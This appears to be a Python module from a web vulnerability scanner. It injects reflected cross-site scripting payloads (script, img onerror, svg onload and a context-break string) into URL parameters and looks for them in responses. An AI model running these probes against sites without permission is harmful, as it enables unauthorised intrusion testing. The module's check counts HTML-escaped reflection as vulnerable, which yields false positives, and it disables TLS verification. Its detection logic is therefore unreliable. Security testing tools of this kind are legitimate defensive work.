import requests, html
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

def _inj(url, param, payload):
    p = urlparse(url)
    qs = parse_qs(p.query)
    qs[param] = payload
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))

PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"><svg/onload=alert(1)>",  # context break
    "<script>confirm`xss`</script>",
]


def scan(url, proxies=None, session=None, **kw):
    session = session or requests.Session()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return {"module": "XSS", "vulnerable": False}

    vulnerable = False
    findings = []
    for p in params:
        for pay in PAYLOADS:
            inj_url = _inj(url, p, pay)
            r = session.get(inj_url, proxies=proxies, timeout=8, verify=False)
            if pay in r.text or html.escape(pay) in r.text:
                vulnerable = True
                findings.append({"param": p, "payload": pay, "url": inj_url})
                break
    return {"module": "XSS", "vulnerable": vulnerable, "findings": findings}